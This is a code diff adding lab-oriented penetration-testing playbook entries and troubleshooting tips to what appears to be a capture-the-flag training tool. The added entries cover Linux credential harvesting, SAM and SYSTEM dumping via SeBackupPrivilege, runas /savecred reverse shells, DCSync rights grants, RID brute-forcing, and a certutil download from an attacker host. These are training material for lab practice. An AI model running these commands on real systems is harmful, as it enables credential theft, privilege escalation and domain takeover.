+      "win": "Interactive root shell confirmed.",
+      "mistakes": [
+        "Forgetting to capture /root/proof.txt immediately after landing as root."
+      ]
+    }
+  ],
+  "linux-root-cred-harvest": [
+    {
+      "when": "Immediately after reaching root (uid=0) on a Linux host.",
+      "land": [
+        "Dump /etc/shadow for offline cracking and sweep /root and /home for SSH private keys and bash history."
+      ],
+      "look": [
+        "root:$6$... hashes in /etc/shadow and -----BEGIN OPENSSH PRIVATE KEY----- blocks."
+      ],
+      "win": "Password hashes and SSH private keys harvested for lateral reuse.",
+      "mistakes": [
+        "Stopping at root.txt without checking whether the box holds keys or passwords for the next host."
+      ]
+    },
+    {
+      "when": "Searching for cleartext database, service, or domain passwords across configs on a rooted Linux host.",
+      "land": [
+        "Grep recursively across /var/www, /opt, /etc, /root, and /home for password, passwd, secret, and db_pass assignments."
+      ],
+      "look": [
+        "Config lines assigning plaintext passwords or connection strings."
+      ],
+      "win": "Cleartext credentials recovered from configuration files or scripts.",
+      "mistakes": [
+        "Omitting /opt or /var/backups where custom application scripts keep service credentials."
+      ]
+    }
+  ],
+  "runas-savedcred-exec": [
+    {
+      "when": "Checking whether the current Windows user profile has cached credentials in Windows Credential Manager.",
+      "land": [
+        "Run cmdkey /list to enumerate saved targets and usernames (such as DOMAIN\\Administrator or local Administrator)."
+      ],
+      "look": [
+        "Target: Domain:interactive=...\nUser: ...\n entries in cmdkey /list output."
+      ],
+      "win": "Cached privileged credential confirmed in Windows Credential Manager.",
+      "mistakes": [
+        "Skipping cmdkey /list during initial Windows enumeration."
+      ]
+    },
+    {
+      "when": "cmdkey /list shows a stored credential for Administrator or another privileged account.",
+      "land": [
+        "Execute a reverse shell binary or administrative command with runas /savecred /user:<cached_user> without being prompted for a password."
+      ],
+      "look": [
+        "New shell callback or command output running as the stored privileged user."
+      ],
+      "win": "Elevated command execution under the stored Administrator token.",
+      "mistakes": [
+        "Passing a username format to /user: that does not match the User field shown in cmdkey /list."
+      ]
+    }
+  ],
+  "sebackup-serestore-abuse": [
+    {
+      "when": "whoami /priv shows SeBackupPrivilege enabled on your token.",
+      "land": [
+        "Save the SAM and SYSTEM registry hives to C:\\Windows\\Temp using reg save, which uses backup semantics to bypass ACLs."
+      ],
+      "look": [
+        "The operation completed successfully. for both sam.save and system.save."
+      ],
+      "win": "SAM and SYSTEM registry hives exported to disk.",
+      "mistakes": [
+        "Running reg save from a non-elevated or non-backup-capable context without SeBackupPrivilege enabled."
+      ]
+    },
+    {
+      "when": "You want to read a protected file (such as proof.txt or a config file in Administrator's profile) using SeBackupPrivilege.",
+      "land": [
+        "Copy the file with robocopy /B (backup mode), which bypasses standard NTFS DACLs."
+      ],
+      "look": [
+        "Copied : 1 in robocopy summary and the file contents printed via type."
+      ],
+      "win": "Protected file copied and read via backup mode.",
+      "mistakes": [
+        "Using copy or type directly (which do not pass FILE_FLAG_BACKUP_SEMANTICS) instead of robocopy /B."
+      ]
+    },
+    {
+      "when": "You transferred sam.save and system.save back to your Kali machine.",
+      "land": [
+        "Extract local Administrator and user NTLM hashes offline with impacket-secretsdump -sam sam.save -system system.save LOCAL."
+      ],
+      "look": [
+        "Administrator:500:aad3b435b51404eeaad3b435b51404ee:<nthash>::: in secretsdump output."
+      ],
+      "win": "Local Administrator NTLM hash extracted for Pass-the-Hash.",
+      "mistakes": [
+        "Exporting only SAM without SYSTEM (SYSTEM holds the boot key required to decrypt SAM)."
+      ]
+    },
+    {
+      "when": "whoami /priv shows SeRestorePrivilege enabled on your token.",
+      "land": [
+        "Modify a SYSTEM service's ImagePath in HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc> and restart the service."
+      ],
+      "look": [
+        "The operation completed successfully. and SYSTEM shell callback on service start."
+      ],
+      "win": "Full NT AUTHORITY\\SYSTEM execution via SeRestorePrivilege service hijack.",
+      "mistakes": [
+        "Picking a service that your user cannot start or that does not run as LocalSystem."
+      ]
+    }
+  ],
+  "smbv1-vuln-verify": [
+    {
+      "when": "Port 445 is open on an older Windows or Samba target, or smb.v1 was flagged during recon.",
+      "land": [
+        "Run nmap with smb-protocols and smb-vuln-ms17-010 to verify the NT LM 0.12 (SMBv1) dialect and check for MS17-010 (EternalBlue)."
+      ],
+      "look": [
+        "NT LM 0.12 (SMBv1) dangerous and VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)."
+      ],
+      "win": "Confirmed whether the target is vulnerable to MS17-010 before firing an exploit.",
+      "mistakes": [
+        "Running smb-vuln-ms17-010 repeatedly against fragile legacy targets without recording the first output."
+      ]
+    },
+    {
+      "when": "Fast non-destructive MS17-010 verification via NetExec.",
+      "land": [
+        "Run nxc smb {{target}} -M ms17-010 to check whether the target is vulnerable to EternalBlue."
+      ],
+      "look": [
+        "MS17-010   [+] Host is likely VULNERABLE to MS17-010!"
+      ],
+      "win": "Safe confirmation of MS17-010 vulnerability status.",
+      "mistakes": [
+        "Jumping straight to a kernel exploit without confirming the vulnerability first."
+      ]
+    }
+  ],
+  "rpc-endpoint-abuse": [
+    {
+      "when": "Port 135 (MSRPC) or 593 is open and you want to map registered RPC interfaces and dynamic high ports.",
+      "land": [
+        "Run impacket-rpcdump @{{target}} to list all UUIDs, named pipes, and TCP endpoints registered with the Endpoint Mapper."
+      ],
+      "look": [
+        "MS-EFSR, MS-RPRN (Print System), MS-PAR, orDRS/SAMR/LSARPC bindings and ncacn_ip_tcp dynamic ports."
+      ],
+      "win": "RPC interfaces and coercion/exploitation surfaces mapped.",
+      "mistakes": [
+        "Ignoring high TCP ports revealed by rpcdump when firewall rules block standard ports."
+      ]
+    },
+    {
+      "when": "Probing MSRPC / SMB named pipes anonymously with rpcclient.",
+      "land": [
+        "Connect with rpcclient -U '' -N {{target}} and run srvinfo, enumdomusers, and querydominfo."
+      ],
+      "look": [
+        "user:[<username>] rid:[0x...] lines and domain/server info."
+      ],
+      "win": "Domain user list and server metadata extracted over anonymous RPC.",
+      "mistakes": [
+        "Forgetting -U '' -N so rpcclient prompts for your local Kali user's password."
+      ]
+    },
+    {
+      "when": "Dumping user descriptions, RIDs, and account flags over SAMR.",
+      "land": [
+        "Run impacket-samrdump against the target (anonymously or with a valid credential)."
+      ],
+      "look": [
+        "Found user: <username>, uid = <rid> and any populated Comment/Description fields."
+      ],
+      "win": "Full SAMR user table and account descriptions dumped.",
+      "mistakes": [
+        "Missing cleartext passwords hidden inside user Comment/Description fields in samrdump output."
+      ]
+    }
+  ],
+  "fix-samr-null-denied": [
+    {
+      "when": "Anonymous SAMR user enumeration (enumdomusers / --users) failed with NT_STATUS_ACCESS_DENIED (blocker.samr_null_denied).",
+      "land": [
+        "Try the Guest account with RID brute-forcing (nxc smb {{target}} -u 'guest' -p '' --rid-brute) to enumerate users via LSARPC SID lookups."
+      ],
+      "look": [
+        "SidTypeUser lines mapping RIDs to DOMAIN\\<username>."
+      ],
+      "win": "Domain usernames recovered via Guest RID cycling despite SAMR null restrictions.",
+      "mistakes": [
+        "Keeping -u '' when anonymous null sessions are blocked but Guest is enabled with a blank password."
+      ]
+    },
+    {
+      "when": "SAMR enumdomusers is blocked, but LSARPC anonymous SID/name translation may still be open.",
+      "land": [
+        "Run rpcclient lsaenumsid and lookupnames for well-known accounts to extract the domain SID, then cycle RIDs."
+      ],
+      "look": [
+        "S-1-5-21-... domain SID and resolved account names."
+      ],
+      "win": "Domain SID and valid usernames enumerated through LSARPC.",
+      "mistakes": [
+        "Assuming all RPC calls are blocked just because SAMR enumdomusers returned NT_STATUS_ACCESS_DENIED."
+      ]
+    },
+    {
+      "when": "Both anonymous SAMR and Guest/LSARPC are restricted and you hold any low-privilege credential.",
+      "land": [
+        "Re-run user enumeration authenticated with nxc smb {{target}} -u '{{user}}' -p '{{password}}' --users."
+      ],
+      "look": [
+        "Domain user list and descriptions returned over authenticated SAMR."
+      ],
+      "win": "Full user list and descriptions unlocked with authenticated access.",
+      "mistakes": [
+        "Retrying anonymous SAMR in a loop after RestrictAnonymousSAM has already denied it."
+      ]
+    }
+  ],
+  "post-proof-loot-sweep": [
+    {
+      "when": "After capturing /root/proof.txt or /home/*/local.txt on a Linux host in a multi-host environment.",
+      "land": [
+        "Run a one-shot sweep of /etc/shadow, ip -4 addr, ip route, arp -an, /etc/hosts, and SSH keys to uncover credentials and dual-homed internal subnets."
+      ],
+      "look": [
+        "Additional NICs/subnets (172.16.x.x, 10.x.x.x), ARP neighbors, /etc/shadow hashes, and SSH private keys."
+      ],
+      "win": "Hashes, keys, and internal network routes collected for the next pivot host.",
+      "mistakes": [
+        "Closing the shell right after reading proof.txt and missing an internal subnet reachable only through this box."
+      ]
+    },
+    {
+      "when": "After capturing proof.txt or local.txt on a Windows host.",
+      "land": [
+        "Check ipconfig /all, route print, arp -a, and cmdkey /list (plus secretsdump from Kali if admin) to harvest cached credentials and internal routes."
+      ],
+      "look": [
+        "Secondary network adapters, internal ARP peers, and stored credentials."
+      ],
+      "win": "Windows credentials and internal pivot routes harvested.",
+      "mistakes": [
+        "Forgetting to check ipconfig /all and arp -a for a second network interface on a compromised Windows host."
       ]
     }
   ]
@@ -14302,6 +15358,16 @@
     'http-request-smuggling': { what: 'When a front-end proxy and the back-end server disagree about where one request ends, you can smuggle a second request inside the first, past front-end access controls and onto the next visitor.' },
     'prototype-pollution': { what: 'In JavaScript every object inherits from a shared prototype, so if an app merges your keys into an object without filtering __proto__, you can add a property like isAdmin to every object at once, which flips an authorization check.' },
     'mass-assignment': { what: 'When a framework maps every field of a request body onto a model, you add a field the form never shows (role, isAdmin) and the app saves it. A fresh admin account is cleaner than escalating a watched one.' },
+    'smb-share-browse-download': { what: 'When an SMB share is readable, listing the root directory is rarely enough: credentials and policy files live buried inside nested folders. This move connects with smbclient or smbmap to walk the share or bulk-pull the entire directory tree to your Kali box.' },
+    'crack-modular-hash': { what: 'Web frameworks and modern apps store passwords as modular hashes (PBKDF2, Argon2, Flask/Werkzeug, Gitea, WordPress phpass). Cracking them offline with hashcat or John turns a leaked database row into a reusable plaintext password.' },
+    'writable-etc-shadow-sudoers': { what: 'When /etc/shadow or /etc/sudoers is writable by your user or group, you do not need an exploit: replace root password hash or grant yourself NOPASSWD sudo and step straight into a root shell.' },
+    'linux-root-cred-harvest': { what: 'Getting root on one machine is often the key to the next one. Sweeping /etc/shadow, SSH keys, shell history, and app configs as root harvests the passwords and keys that unlock neighboring hosts.' },
+    'runas-savedcred-exec': { what: 'Windows Credential Manager sometimes caches an Administrator password so scheduled jobs or admins do not have to retype it. When cmdkey /list shows a saved credential, runas /savecred lets you run a command or shell as that user with no password prompt.' },
+    'sebackup-serestore-abuse': { what: 'SeBackupPrivilege lets you read any file on the system (including the SAM and SYSTEM registry hives), and SeRestorePrivilege lets you overwrite protected files or service paths. Either privilege is a direct path to SYSTEM.' },
+    'smbv1-vuln-verify': { what: 'When a target speaks the legacy SMBv1 dialect, you verify safely whether it is vulnerable to MS17-010 (EternalBlue) using Nmap NSE or NetExec before deciding whether to run a kernel exploit.' },
+    'rpc-endpoint-abuse': { what: 'MSRPC on port 135 and 445 advertises internal Windows services, dynamic ports, and user accounts. Dumping the endpoint mapper and querying SAMR/LSARPC surfaces coercion targets and domain usernames.' },
+    'fix-samr-null-denied': { what: 'Modern Windows servers block anonymous SAMR user listings (NT_STATUS_ACCESS_DENIED) even when SMB connects. Pivoting to Guest RID brute-forcing, LSARPC SID lookups, or an authenticated session bypasses that block and recovers the user list.' },
+    'post-proof-loot-sweep': { what: 'Capturing the flag proves you owned this box, but credentials and network routes on it are how you reach the rest of the network. This post-proof sweep collects hashes, keys, and internal interfaces before you move on.' },
   };
 
   // "Once You Are In": the first-breath orientation commands a learner needs the moment a shell lands and
@@ -14344,9 +15410,17 @@
     'blocker.winrm_closed': { title: 'WinRM / PowerShell Remoting Unreachable', why: 'TCP 5985/5986 is closed or WSMan refused the connection.', body: 'Evil-WinRM cannot connect without WinRM listening. Switch to SMB/RPC lateral execution (impacket-psexec, impacket-wmiexec, impacket-smbexec) or RDP.', code: 'impacket-wmiexec <domain>/<user>:<pass>@<target>' },
     'blocker.nxc_spider_usage': { title: 'spider_plus Flag Syntax', why: 'spider_plus is a NetExec module (-M spider_plus), not a standalone CLI flag.', body: 'Invoke spider_plus with -M spider_plus (and add -o DOWNLOAD_FLAG=True to pull readable files).', code: 'nxc smb <target> -u <user> -p <pass> -M spider_plus -o DOWNLOAD_FLAG=True' },
     'blocker.account_restricted': { title: 'Account Disabled or Restricted', why: 'STATUS_ACCOUNT_DISABLED or STATUS_ACCOUNT_RESTRICTION: the account exists and the password may be right, but logon is blocked by policy.', body: 'If you have WriteAccountControl or GenericAll over the account, re-enable it via bloodyAD or PowerView; otherwise switch to another discovered credential.', code: 'bloodyAD -u <user> -p <pass> -d <domain> --host <dc-ip> remove uac <target-user> -f ACCOUNTDISABLE' },
-    'blocker.dcsync_denied': { title: 'DCSync Denied - Missing Replication Rights', why: 'DRSUAPI ERROR_DS_DRA_BAD_DN / ERROR_DS_DRA_ACCESS_DENIED: the account does not hold Replicating Directory Changes + Replicating Directory Changes All on the domain root yet.', body: 'You must walk the ACL chain first. If you have GenericAll or WriteDacl over an intermediate group (such as Exchange Windows Permissions), add your account to that group and then grant yourself DCSync rights on the domain root before running secretsdump.', code: 'bloodyAD -u <user> -p \'<pass>\' -d <domain> --host <dc-ip> add dcsync <user>' },
+    'blocker.dcsync_denied': { title: 'DCSync Denied - Missing Replication Rights', why: 'DRSUAPI ERROR_DS_DRA_BAD_DN / ERROR_DS_DRA_ACCESS_DENIED: the account does not hold Replicating Directory Changes + Replicating Directory Changes All on the domain root yet.', body: 'You must walk the ACL chain first. If you have GenericAll or WriteDacl over an intermediate group (such as Exchange Windows Permissions), add your account to that group and then grant yourself DCSync rights on the domain root before running secretsdump.', code: "bloodyAD -u '<user>' -p <pass> -d <domain> --host <dc-ip> add dcsync '<user>'" },
+    'blocker.acl_reauth': { title: 'ACL Write Denied (Group Membership Reverted or Stale Token)', why: 'LDAP insufficientAccessRights (50): the DC rejected add dcsync because your account is no longer in the group that holds WriteDacl on the domain root (shared lab cleanup tasks periodically reset group memberships every few minutes), or a cached Kerberos ticket predates the group add.', body: 'Re-add yourself to the privileged group and run add dcsync back-to-back in a single chained command so no lab cleanup timer can fire between the two steps (and clear any stale Kerberos ccache if using -k).', code: "bloodyAD -d <domain> --host <dc-ip> -u '<user>' -p <pass> add groupMember \"<group>\" '<user>' && bloodyAD -d <domain> --host <dc-ip> -u '<user>' -p <pass> add dcsync '<user>'", gotcha: 'Shared lab boxes often run a background scheduled task every few minutes that strips non-default members from Exchange Windows Permissions and similar groups. Always run the group join and the DACL grant immediately one after the other.' },
     'blocker.nxc_bh_config': { title: 'NetExec BloodHound-CE Config Conflict', why: 'Your ~/.nxc/nxc.conf has bh_enabled / BloodHound-CE enabled, which breaks nxc ldap --bloodhound.', body: 'Run bloodhound-python directly instead (Command 1 on Collect BloodHound Data), or disable bh_enabled in ~/.nxc/nxc.conf.', code: 'bloodhound-python -d <domain> -u <user> -p \'<pass>\' -ns <dc-ip> -c All --zip' },
     'blocker.maq_zero': { title: 'MachineAccountQuota Is 0', why: 'ms-DS-MachineAccountQuota is 0, so standard domain users cannot add a new machine account for RBCD, noPac, or Certifried.', body: 'Use an existing compromised machine account (via a machine hash or silver ticket), or check BloodHound for an OU where your principal holds CreateChild (Computer) rights.', code: null },
+    'blocker.certutil_usage': { title: 'certutil Argument Syntax', why: 'CertUtil rejected the command-line arguments (wrong flag order or unquoted URL/path).', body: 'Pass -urlcache -split -f followed by the URL and the destination filename on disk.', code: 'certutil -urlcache -split -f http://<lhost>:8000/<file> C:\\Windows\\Temp\\<file>' },
+    'blocker.password_restriction': { title: 'Password Policy Restriction', why: 'NT_STATUS_PASSWORD_RESTRICTION (0xc000006c): the domain rejected the new password due to minimum length, complexity, password history, or minimum password age.', body: 'Pick a longer complex password (12+ characters with uppercase, lowercase, digits, and a symbol, e.g. ObolP@ssw0rd2026!). If it still fails, Minimum Password Age (> 0 days) is blocking user-level self-resets (setuserinfo2 / smbpasswd): use a GenericAll / ForceChangePassword ACL reset (bloodyAD set password) from a controlling principal instead.', code: "rpcclient -U '<domain>/<user>%<pass>' <target> -c 'getdompwinfo'" },
+    'blocker.host_down': { title: 'Host Seems Down (ICMP Blocked)', why: 'Nmap reported the host as down because Windows Firewall or a router dropped the ICMP ping probe.', body: 'Re-run Nmap with -Pn to skip host discovery and scan TCP ports directly.', code: 'nmap -Pn -p- --min-rate 5000 --open <target>' },
+    'blocker.responder_quiet': { title: 'Responder Is Quiet (No Broadcast Traffic)', why: 'Responder is listening in analyse or poison mode, but no LLMNR/NBT-NS/mDNS broadcast queries have arrived.', body: 'Confirm you passed the VPN/lab interface (-I tun0), or actively coerce authentication from a target (PetitPotam / PrinterBug / MSSQL xp_dirtree) instead of waiting passively.', code: 'sudo responder -I tun0 -wv' },
+    'blocker.tls_scheme': { title: 'TLS / HTTPS Scheme Mismatch or Self-Signed Cert', why: 'You spoke plain HTTP to an HTTPS port (400 Bad Request: plain HTTP request was sent to HTTPS port) or TLS verification rejected a self-signed certificate.', body: 'Switch the URL scheme to https:// and pass -k (curl) or -mc all to ignore self-signed certificate errors, and add the certificate CN/SAN to /etc/hosts.', code: 'curl -skI https://<target>/' },
+    'blocker.access_denied': { title: 'Access Denied (Insufficient Privileges)', why: 'The operation was refused with Access is denied / Permission denied / EACCES.', body: 'Your current account or integrity level lacks the required ACL or privilege. On Windows, check if you are a filtered local admin needing UAC bypass (whoami /groups) or missing a token privilege (whoami /priv); on Linux, check sudo -l, group memberships (id), and file ownership.', code: 'whoami /groups & whoami /priv' },
+    'blocker.samr_null_denied': { title: 'SAMR Null Session Denied (RestrictAnonymousSAM)', why: 'Anonymous SMB connected, but SAMR user enumeration (enumdomusers / --users) returned NT_STATUS_ACCESS_DENIED.', body: 'Modern Windows hosts block anonymous SAMR queries by default. Pivot to Guest RID cycling (--rid-brute), LSARPC SID lookups (lsaenumsid / lookupsid), or authenticate with a discovered credential.', code: "nxc smb <target> -u 'guest' -p '' --rid-brute" },
   };
 
   // Resolve a (move, command index) to a canvas note, with a graceful fallback to the pack's own command
